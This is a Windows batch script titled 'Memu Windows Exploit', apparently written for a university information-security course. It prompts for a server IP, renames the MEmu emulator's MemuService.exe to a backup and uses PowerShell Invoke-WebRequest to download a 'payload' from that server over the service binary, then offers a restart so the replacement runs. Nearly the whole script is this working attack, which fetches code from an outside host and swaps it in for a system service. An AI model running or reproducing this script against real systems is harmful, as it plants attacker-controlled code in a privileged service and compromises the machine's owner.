@echo off

echo "---- Memu Windows Exploit -----"
echo "---- InfoSec Course UNIBZ -----"
echo "---- [ press any key... ] -----"

pause>nul 

:BEGIN 

set /p _ip= Please enter server's ip: 

set _url= "http://%_ip%/MemuService.exe"

echo %_url%


set /p _ans= Do you want to continue? [y/n or quit]

if "%_ans%" == "y" (GOTO CHECKPATH) else if "%_ans%" == "quit" (GOTO END) else (GOTO BEGIN)

pause>nul


:CHECKPATH

if exist "C:\Program Files (x86)\Microvirt\MEmu\" GOTO FIRSTPATH

if exist "C:\Program Files\Microvirt\MEmu\" GOTO SECONDPATH

echo "PATH ERROR, check your program's installation path. Enter any key to close."

pause>nul

GOTO FINISH


:FIRSTPATH

set target=C:\Program Files (x86)\Microvirt\MEmu\MemuService.exe

echo "Process refactor: "

ren "C:\Program Files (x86)\Microvirt\MEmu\MemuService.exe" MemuService.bak

echo "DONE"

echo "Payload injection: "

powershell -Command "Invoke-WebRequest -Uri %_url% -OutFile '%target%'"

echo "DONE"

echo "Now restart the system."

pause>nul


GOTO FINISH


:SECONDPATH

set target=C:\Program Files\Microvirt\MEmu\MemuService.exe

echo "Process refactor: "

ren "C:\Program Files\Microvirt\MEmu\MemuService.exe" MemuService.bak

echo "DONE"

echo "Payload injection: "

powershell -Command "Invoke-WebRequest -Uri %_url% -OutFile '%target%'"

echo "DONE"


:FINISH

set /p _shut= Process finished, please choose to restart(r), shutdown(s) or end the script with any key.

if "%_shut%" == "r" (shutdown.exe /r /t 00) else if "%_shut%" == "s" (shutdown.exe /s /t 00)

:END